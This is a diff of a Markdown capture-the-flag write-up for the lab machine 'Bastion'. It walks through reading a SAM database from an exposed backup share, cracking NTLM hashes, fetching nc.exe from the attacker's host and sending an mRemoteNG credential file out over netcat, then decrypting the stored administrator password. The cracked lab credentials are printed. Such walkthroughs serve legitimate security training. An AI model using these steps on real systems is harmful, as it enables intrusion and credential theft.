@@ -12,7 +12,7 @@ tags:
 ![img](/images/writeup-bastion/1.png)
 {{%/summary%}}
 
-Bastion proved to be a very easy yet pretty fun challenge, quite unique in its kind even if it doesn't present any particular difficulties, all one needs to complete this box is a search engine to learn how to accomplish certain tasks, all of which only take a couple minutes to solve, hence why so many people finished this box despite it not being one of those two clicks to root kind of boxes (I'm looking at you, Blue, Jerry, Lame, etc...). The first half of the challenge involves finding a Windows backup containing an old copy of the SAM database, which when read gives us SSH credentials to log in the box. Once inside the administrator's password must be extracted from the saved settings of a remote sesisons manager.
+Bastion proved to be a very easy yet pretty fun challenge, quite unique in its kind even if it doesn't present any particular difficulties, all one needs to complete this box is a search engine to learn how to accomplish certain tasks, all of which only take a couple minutes to solve, hence why so many people finished this box despite it not being one of those two clicks to root kind of boxes (I'm looking at you, Blue, Jerry, Lame, etc...). The first half of the challenge involves finding a Windows backup containing an old copy of the SAM database, which when read gives us SSH credentials to log in the box. Once inside the administrator's password must be extracted from the saved settings of a remote sessions manager.
 
 ---
 
@@ -32,7 +32,8 @@ $ smbclient -L 10.10.10.134
 
 Backups seems to be the only unprotected share on the system so let's access it and see what's inside:
 
-```shell-session
+
+```shell-session
 $ smbclient \\\\10.10.10.134\\Backups
 ```
 
@@ -48,27 +49,34 @@ One of these files is very big though so downloading it isn't very convenient, a
 
 But there is a solution to this problem. I'm going to mount this share on my own system and then mount the vhd files from there, giving me access to their content without having to download the whole huge file locally. We need to install two additional tools for this task:
 
-```shell-session
+
+```shell-session
 $ sudo apt-get install cifs-utils
 $ sudo apt-get install libguestfs-tools
 ```
-
+
+
 Then we mount the share on our computer:
 
-```shell-session
+
+```shell-session
 $ mount -t cifs //10.10.10.134/Backups /mnt/remote -o rw
 ```
-
+
+
 So now we can access the share from /mnt/remote:
 
 ![img](/images/writeup-bastion/7.png)
 
 Once navigated to the folder where the two .vhd files reside we can mount them on our disk with guestmount:
 
-```shell-session
+
+
+```shell-session
 $ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
 ```
-
+
+
 So we have the whole disk at our disposal now!
 
 ![img](/images/writeup-bastion/8.png)
@@ -83,7 +91,10 @@ The Users folder does not contain any flags and really there are only two truly 
 
 We can list the users of which the crentials are stored in the SAM file using *chntpw* however if we mounted the virtual disk on a read-only mount we have to copy the file in a different folder first:
 
-```shell-session
+
+
+
+```shell-session
 $ chntpw -l SAM
 ```
 
@@ -91,7 +102,9 @@ $ chntpw -l SAM
 
 The Administrator and Guest accounts appear to be disabled so we cannot retrieve the administrator's password, however L4mpje isn't, so we can dump its hash and crack it with hashcat. First we use *samdump2* to create a text file containing all the hashes:
 
-```shell-session
+
+
+```shell-session
 $ samdump2 ./SYSTEM ./SAM > /home/baud/bastion/hash.txt
 ```
 
@@ -103,7 +116,8 @@ The last field is the hashed password, hashed in NTLM. In order for hashcat to c
 
 Once we have the file with the correct hash in it we can use hashcat for a dictionary attack to crack it, I'm going to use the classic *rockyou.txt* wordlist, which is pretty much always sure to hit the target in CTF challenges:
 
-```shell-session
+
+```shell-session
 $ hashcat -m 1000 -a 0 hashcat.txt rockyou.txt --force
 ```
 
@@ -113,7 +127,9 @@ $ hashcat -m 1000 -a 0 hashcat.txt rockyou.txt --force
 
 So now we have a pair of working credentials that we can use to login using the SSH service running on the box:
 
-```shell-session
+
+
+```shell-session
 User: L4mpje
 Pass: bureaulampje
 ```
@@ -133,11 +149,17 @@ It takes only a few seconds of Googling to find out that mRemoteNG saves the set
 ```shell-session
 encrypted_pass = base64(IV + AES-128-CBC(cleartext_pass, md5(mR3m), IV))
 ```
-
----
-
-## Privilege escalation: decrypting stored mRemoteNG passwords
-
+
+
+---
+
+
+
+
+
+## Privilege escalation: decrypting stored mRemoteNG passwords
+
+
 All the passwords are stored in a file called confCons.xml which can be found at *%appdata%\mRemoteNG\*:
 
 ![img](/images/writeup-bastion/17.png)
@@ -148,18 +170,26 @@ The file can be downloaded on our own box using *nc.exe* (or just use *net use* 
 $ powershell Invoke-WebRequest "http://10.10.14.29:8080/nc.exe -OutFile "./nc.exe"
 ```
 
-Then we set up a netcat listener on our box:
 
-```shell-session
+
+Then we set up a netcat listener on our box:
+
+
+
+```shell-session
 $ nc -lvp 9999 > confCons.xml
 ```
-
+
+
 And then we send the file from Bastion:
 
-```shell-session
+
+
+```shell-session
 $ nc -w 3 10.10.14.29 9999 < %appdata%\mRemoteNG\confCons.xml
 ```
-
+
+
 Once the file is transferred we can open it to see its content and we can notice that one of the saved sessions belongs to the Administrator account:
 
 ![img](/images/writeup-bastion/18.png)
@@ -170,7 +200,8 @@ Now it's time to decrypt this password. I'm going to use [this](https://github.c
 
 So now we have the administrator's credentials too!
 
-```shell-session
+
+```shell-session
 User: Administrator
 Pass: thXLHM96BeKL0ER2
 ```
